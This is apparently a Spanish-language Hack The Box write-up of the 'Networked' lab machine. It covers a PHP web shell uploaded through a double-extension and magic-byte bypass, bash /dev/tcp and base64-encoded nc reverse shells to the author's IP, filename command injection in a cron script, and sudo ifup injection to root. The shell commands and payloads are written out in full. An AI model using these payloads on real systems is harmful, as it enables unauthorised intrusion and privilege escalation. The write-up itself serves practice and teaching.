---
tags:
title: Networked - Easy (HTB)
permalink: /Networked-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Introduccion

# Reconocimiento

```bash
nmap -sS -p- --open --min-rate 5000 -n -vvv 10.129.254.230 -oG allPorts 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 02:43 -03
Initiating Ping Scan at 02:43
Scanning 10.129.254.230 [4 ports]
Completed Ping Scan at 02:43, 0.45s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 02:43
Scanning 10.129.254.230 [65535 ports]
Discovered open port 80/tcp on 10.129.254.230
Discovered open port 22/tcp on 10.129.254.230
Completed SYN Stealth Scan at 02:43, 27.72s elapsed (65535 total ports)
Nmap scan report for 10.129.254.230
Host is up, received echo-reply ttl 63 (0.55s latency).
Scanned at 2025-12-08 02:43:32 -03 for 27s
Not shown: 65500 filtered tcp ports (no-response), 32 filtered tcp ports (host-prohibited), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.28 seconds
           Raw packets sent: 131055 (5.766MB) | Rcvd: 42 (2.712KB)
```

## Website / Port 80 

El sitio web principal no muestra nada solo este mensaje. 

![image-center](/assets/images/{1766DB84-63E0-4308-9A04-ACB64E2A0FBB}.png)

## Ferozbuster enumeration

El escaneo me revela la ruta `/backup`, con un comprimido.

```bash
feroxbuster -u http://networked.htb -x php   
<SNIP>
200      GET        8l       40w      229c http://networked.htb/
200      GET        0l        0w        0c http://networked.htb/lib.php
301      GET        7l       20w      236c http://networked.htb/backup => http://networked.htb/backup/
301      GET        7l       20w      237c http://networked.htb/uploads => http://networked.htb/uploads/
200      GET      201l      582w    10240c http://networked.htb/backup/backup.tar
200      GET        5l       13w      169c http://networked.htb/upload.php
200      GET        8l       40w      229c http://networked.htb/index.php
```
### Backup

Desde acá me lo descargo

![image-center](/assets/images/{6B693F84-D918-441B-AF41-17D6DAF81E9B}.png)

Con el siguiente comando lo descomprimí para obtener los archivos.

```bash
tar -xvf backup.tar                        
index.php
lib.php
photos.php
upload.php
```
### Code review

### lib.php

```php
<?php
function getnameCheck($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  #echo "name $name - ext $ext\n";
  return array($name,$ext);
}

function getnameUpload($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  return array($name,$ext);
}

function check_ip($prefix,$filename) {
  //echo "prefix: $prefix - fname: $filename<br>\n";
  $ret = true;
  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
    $ret = false;
    $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
  } else {
    $msg = $filename;
  }
  return array($ret,$msg);
}

function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
      $mime = @finfo_file($finfo, $file['tmp_name']);
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
      }
    }
  }
  if (function_exists('mime_content_type'))
  {
    $file_type = @mime_content_type($file['tmp_name']);
    if (strlen($file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
    {
      return $file_type;
    }
  }
  return $file['type'];
}

function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}

```

Lo que mas destaca de ese código, son las validaciones que se realizan sobre el `MIME TYPE` de los archivos que se suben a la pagina, además corrobora el `Content-Type` de el mismo archivo verificando que sea algo como `image/jpeg, image/png`, etc.

### upload.php

```php
<?php
require '/var/www/html/lib.php';

define("UPLOAD_DIR", "/var/www/html/uploads/");

if( isset($_POST['submit']) ) {
  if (!empty($_FILES["myFile"])) {
    $myFile = $_FILES["myFile"];

    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }

    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "<p>An error occurred.</p>";
        displayform();
        exit;
    }

    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

    if (!($valid)) {
      echo "<p>Invalid image file</p>";
      displayform();
      exit;
    }
    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;

    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
    if (!$success) {
        echo "<p>Unable to save file.</p>";
        exit;
    }
    echo "<p>file uploaded, refresh gallery</p>";

    // set proper permissions on the new file
    chmod(UPLOAD_DIR . $name, 0644);
  }
} else {
  displayform();
}
?>
```

Ahora viendo este otro código, veo que valida las extensiones que sean las de una imagen `(png, jpeg, etc)`

```php
$validext = array('.jpg', '.png', '.gif', '.jpeg');
```

Otra cosa a tener en cuenta es como se guarda y donde el archivo al ser cargado exitosamente.

```php
$name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;
```

Lo que hace es tomar la `ip` desde donde se carga el archivo y así renombrar el nombre del mismo con la `ip`, reemplazando así, los `.` por `_`, haciendo que si por ejemplo subo un `cmd.php.jpeg` el archivo se carga como `10_10_x_x.php.jpeg`, en el directorio `/var/www/html/uploads/`.
## Double extension Bypass

Además lo mas importante, reside en la siguiente linea, del archivo `lib.php`, la cual muestra la vulnerabilidad:

```php
function getnameCheck($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  #echo "name $name - ext $ext\n";
  return array($name,$ext);
}
```

Esta función básicamente lo que hace es tomar el nombre completo del archivo, incluyendo la extensión, haciendo que `explode()`, en caso de que suba un `cmd.php.jpeg` pase a esto -> `['cmd', 'php', 'jpeg']`, para que luego `array_shift()` saque el primer elemento `(cmd)`, por lo que queda -> `['php', 'jpeg']`, de manera que así en la variable `$ext` la extensión se guarda como : `php.jpeg`, sin sanitizar la doble extensión, lo que a mi me permite cargar un archivo `php` malicioso con el siguiente contenido.

```php
<?php
  system($_GET['cmd']);
?>
```
## Shell as apache
### Testing

 Si me voy a la ruta `/upload.php/` veo el panel con la subida de archivos, el cual probando subir el archivo con el nombre `cmd.php` me da el siguiente error:
  
![image-center](/assets/images/{AE64AAE8-A2DA-4BE3-BE17-9C65B8FB98E6}.png)

Intercepte la petición con `Burpsuite` de manera que puedo ir jugando, es así que agregándole el `Content-Type` que necesita `image/...)`, y además, burlar la validación del `MIME TYPE` con el carácter `GIF8;` indicándole los `magic bytes` de una imagen `GIF`.

![image-center](/assets/images/{68DDAF71-40B7-4C36-B221-B81ABAA2484D}.png)

Ahora que el archivo se subió correctamente puedo verificar la ruta, sabiendo que mi `ip` es `10.10.17.19` el nombre quedaría algo así como `10_10_17_19.php.jpeg`, lo puedo verificar con `curl`.

```bash
curl -s -X GET 'http://networked.htb/uploads/10_10_17_19.php.jpeg?cmd=whoami'
GIF8;
apache
```

Y como tengo ejecución de comandos ya puedo enviarme una `shell` a mi maquina.

```bash
curl -s -X GET 'http://networked.htb/uploads/10_10_17_19.php.jpeg?cmd=%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.17.19%2F4444%200%3E%261'
```

Y desde mi listener `nc` recibo la shell.

```bash
nc -nlvp 4444  
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.254.230] 36686
bash: no job control in this shell
bash-4.2$ whoami
whoami
apache
```

## Shell as guly

Veo que en directorio de `guly` esta la flag, pero no la puedo ver.

```bash
bash-4.2$ cd guly
cd guly
bash-4.2$ ls
ls
check_attack.php
crontab.guly
user.txt
bash-4.2$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```
### Code review

Sin embargo desde la shell como `apache` puedo ver el script del usuario `guly`.

```php
cat check_attack.php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

Este script tiene una vulnerabilidad `Command Injection`, mas en concreto en la siguiente linea:

```php
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

Ya que ejecuta `nohup` y borrando el `path` junto con el `value`, sabiendo que el path es `/var/www/html/uploads/` y `value` el nombre del archivo y además redirigiendo el output al `dev/null`. Es ahí donde entra la inyección ya que no se sanitiza caracteres como `;`, haciendo que yo pueda inyectar comandos

```php
exec("nohup /bin/rm -f /var/www/html/uploads/test; nc 10.10.17.19 4444 -c /bin/sh; b > /dev/null 2>&1 &");
```

Haciendo eso, que envié un shell a mi maquina, el problema es que la shell al usar `nc` se muere, por lo que use el siguiente `payload` en `base64` para poder recibir la `shell`.

```bash
touch '/var/www/html/uploads/test; echo bmMgMTAuMTAuMTcuMTkgNDQ0NCAtZSAvYmluL2Jhc2g= | base64 -d | sh; b'
ls
10_10_17_19.jpeg
10_10_17_19.php.jpeg
127_0_0_1.png
127_0_0_2.png
127_0_0_3.png
127_0_0_4.png
index.html
test; echo bmMgMTAuMTAuMTcuMTkgNDQ0NCAtZSAvYmluL2Jhc2g= | base64 -d | sh; b
```

Y después de los `3` minutos que marca el script segun la tarea `cron` recibo mi shell como el usuario `guly`.

```bash
sudo nc -nlvp 4444
[sudo] password for zsln: 
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.254.230] 36710
whoami
guly
```

```bash
pwd  
/home/guly
cat user.txt
2a0c386246e92ab9ef0740a68ddf34e4
```
## Shell as root

Como el usuario `guly` tengo el privilegio de ejecutar el script `/usr/local/sbin/changename.sh` como cualquier usuario, en mi caso como `root`.

```bash
sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```


```bash  
cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

Lo que hace el script es :  crear/modificar el archivo `/etc/sysconfig/network-scripts/ifcfg-guly`, luego le pide al usuario ingresar valores para variables de red (`NAME`, `PROXY_METHOD`, etc.), escribe esas variables en el archivo de configuración, y por ultimo, ejecuta `/sbin/ifup guly0` que procesa ese archivo

Lo que tiene de bueno es los caracteres permitidos, dentro del mismo.

```bash
regexp="^[a-zA-Z0-9_\ /-]+$"
```
## Command injection

La variable `NAME` en los archivos de configuración de red **puede ejecutar comandos** cuando se procesa con `ifup`.
### Testing

Haciendo una prueba ejecuto el script.

```bash
sudo /usr/local/sbin/changename.sh
interface NAME:
test test
interface PROXY_METHOD:
test test
tinterface BROWSER_ONLY:
est test
interface BOOTPROTO:
test test
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
```

De manera que el archivo queda de la siguiente forma.

```bash
cat /etc/sysconfig/network-scripts/ifcfg-guly
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=test test
PROXY_METHOD=test test
BROWSER_ONLY=test test
BOOTPROTO=test test
```

Pero ahora inyectando comandos:

```bash
sudo /usr/local/sbin/changename.sh
interface NAME:
test id
interface PROXY_METHOD:
test whoami
interface BROWSER_ONLY:
test ls /root
interface BOOTPROTO:
test
uid=0(root) gid=0(root) groups=0(root)
root
root.txt
uid=0(root) gid=0(root) groups=0(root)
root
root.txt
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
```
### Shell

Como veo que el output cambia ya puedo convertir a una `bash` de `root` con el comando : `/bin/bash`

```bash
sudo /usr/local/sbin/changename.sh
interface NAME:
a /bin/bash
interface PROXY_METHOD:
a id
interface BROWSER_ONLY:
a test
interface BOOTPROTO:
a test
whoami
root
```

```bash
cat /root/root.txt
66efddb32f957ea4870dde53edbbbbc3
```

`~Happy Hacking.`

